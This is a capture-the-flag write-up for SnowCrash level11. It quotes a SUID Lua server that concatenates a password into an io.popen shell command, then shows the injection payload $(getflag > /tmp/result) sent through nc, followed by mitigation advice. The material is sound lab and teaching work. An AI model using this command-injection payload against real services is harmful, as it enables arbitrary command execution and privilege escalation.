## 📄 Description

This level provides a Lua script with SUID permissions, running as the `flag11` user. The script listens on `127.0.0.1:5151`, asks for a password, and hashes the input using a shell command. Our goal is to exploit this behavior to run `getflag` as `flag11` and capture the flag.

## 🧩 Challenge Overview

- We have a Lua script named `level11.lua` that is owned by `flag11` and has the **SUID** bit set, so it runs with `flag11` privileges when executed by `level11` :
```
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

- The script uses `io.popen` to run a shell command that hashes user input :
```
level11@SnowCrash:~$ cat level11.lua 
[...]
  prog = io.popen("echo "..pass.." | sha1sum", "r")
[...]
```
- User input is directly concatenated into the shell command without any sanitization.
```
level11@SnowCrash:~$ cat level11.lua 
[...]
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
[...]
```

- Exploiting this allows running commands as `flag11` since the Lua script has the *SUID* bit set.

## ⚔️ Exploitation Strategy

- Connect to the Lua server running on 127.0.0.1 port 5151 using netcat:
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:
```

- Inject the payload $(getflag > /tmp/result) as the password input to execute the getflag command and redirect its output:
```
Password: $(getflag > /tmp/result)
Erf nope..
```

## ✅ Result

- Read the flag stored in /tmp/result:
```
level11@SnowCrash:~$ cat /tmp/result
Check flag.Here is your token : 
```

## 🛡️ Mitigation Advice

- Avoid `direct` concatenation of user input into shell commands to prevent **injection vulnerabilities**.
- Implement `rigorous input validation` and `strict filtering mechanisms`.
- Remove the `SUID` bit from scripts unless absolutely necessary to minimize privilege escalation risks.
